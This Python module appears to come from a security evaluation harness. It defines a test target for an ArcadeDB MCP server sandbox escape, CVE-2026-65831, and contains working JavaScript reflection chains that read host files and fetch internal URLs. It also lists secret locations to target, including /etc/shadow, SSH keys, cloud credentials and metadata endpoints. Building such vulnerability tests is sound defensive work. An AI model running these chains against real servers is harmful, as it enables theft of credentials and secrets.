"""CVE-2026-65831: ArcadeDB polyglot-JS sandbox escape over the MCP stdio server.

The execute_command tool forwards {language:"js", command:<script>} to the polyglot engine. On
<26.7.1 the engine runs the script under HostAccess.ALL, so the bound `database` object yields a
reflection chain (database.getClass().getClassLoader().loadClass(...)) to any host class. With
java.io.* it reads any host file (arbitrary_read); with java.net.* it fetches any address the
process can reach (internal_fetch). Process creation is disabled (allowCreateProcess=false), so
command_execution is not reachable. 26.7.1 denies host access to Class/ClassLoader/reflect, so the
chain throws before it touches a file or a socket, for every principal (the stdio session is root).
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import arcadedb_mcp_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places, PlantKind
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_planting_spec import resolve_container_path
from evals.cve_targets import CVETarget
from mcp_auditor.domain.ports import MCPClientPort

WORKDIR = "/home/arcadedb"
DATABASE = "mydb"

# Every exploit walks the bound object to the class loader; the benign call never does.
AIM = re.compile(r"getClassLoader\(\)")

# The places the escape reaches that ArcadeDB never reaches itself: file reads at absolute or
# $HOME-rooted paths, the process environment, the hostname, and the holder-bound metadata
# endpoints. The three source=layout places the kit deferred (workspace-dotenv and its siblings
# bare-remote-url, bare-history-env) are not kept: the escape reads host files by absolute path,
# but _command_for builds a read only for FILE / ENV / HOSTNAME / HTTP_ENDPOINT kinds, and a layout
# node carries a layout kind with no reflection-read exploit, so no nonce would surface for it.
KEPT_PLACES: tuple[str, ...] = (
    "etc-shadow",
    "container-hostname",
    "aws-credentials",
    "gcloud-adc",
    "azure-profile",
    "ssh-private-key",
    "shell-history",
    "git-credentials",
    "npmrc",
    "gh-hosts",
    "docker-config",
    "kube-config",
    "pgpass",
    "mysql-client-cnf",
    "mongorc",
    "mysql-system-cnf",
    "proc-environ",
    "run-secrets",
    "k8s-sa-token",
    "etc-hosts",
    "auth-log",
    "imds",
    "ecs-task-credentials",
    "eks-pod-identity",
)

_PREAMBLE = (
    "var cl=database.getClass().getClassLoader();"
    'var S=cl.loadClass("java.lang.String");'
    'var Sc=cl.loadClass("java.util.Scanner");'
)


def _read_file_js(path: str) -> str:
    return (
        _PREAMBLE
        + 'var F=cl.loadClass("java.io.File");'
        + f'var f=F.getConstructor(S).newInstance("{path}");'
        + "var sc=Sc.getConstructor(F).newInstance(f);"
        + 'sc.useDelimiter("\\\\A").next();'
    )


def _fetch_url_js(url: str) -> str:
    return (
        _PREAMBLE
        + 'var U=cl.loadClass("java.net.URL");'
        + 'var IS=cl.loadClass("java.io.InputStream");'
        + f'var u=U.getConstructor(S).newInstance("{url}");'
        + 'var is=U.getMethod("openStream").invoke(u);'
        + "var sc=Sc.getConstructor(IS).newInstance(is);"
        + 'sc.useDelimiter("\\\\A").next();'
    )


def _command_for(place: Place) -> str:
    kind = place.kind
    if kind is PlantKind.HTTP_ENDPOINT:
        return _fetch_url_js(f"http://{place.coordinates.host}{place.coordinates.path}")
    if kind is PlantKind.ENV:
        return _read_file_js("/proc/self/environ")  # the server JVM's own environment
    if kind is PlantKind.HOSTNAME:
        return _read_file_js("/etc/hostname")
    if kind is PlantKind.FILE:
        return _read_file_js(resolve_container_path(_file_path(place), WORKDIR))
    raise ValueError(f"{place.id}: kind {kind} is not reachable by this flaw")


def _file_path(place: Place) -> str:
    coord = place.coordinates
    if coord.path is not None:
        return coord.path
    if coord.paths:
        return coord.paths[0]
    raise ValueError(f"{place.id}: a file place with no path coordinate")


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        command = _command_for(places[place_id])
        await client.call_tool(
            "execute_command", {"database": DATABASE, "language": "js", "command": command}
        )

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    # Same tool, a plain SQL read: no polyglot, no reflection, no nonce. The negative control.
    await client.call_tool(
        "execute_command", {"database": DATABASE, "language": "sql", "command": "SELECT 1 AS probe"}
    )


TARGET = CVETarget(
    cve_id="CVE-2026-65831",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.READ_OUTSIDE_SCOPE,
    aim=AIM,
    reaches=frozenset({"arbitrary_read", "internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2026-65831-arcadedb", "sentinel"),
    server_image="holdout-2026-65831-arcadedb",
    patched_image="holdout-2026-65831-arcadedb-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory=WORKDIR, has_network=False
    ),
    builder=arcadedb_mcp_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "GraalVM polyglot-JS sandbox escape: execute_command runs a js script under HostAccess.ALL "
        "so a reflection chain from the bound database object reaches java.io.* to read any host "
        "file and java.net.* to fetch any internal address, both returned in the tool response."
    ),
    tools_filter=None,
)
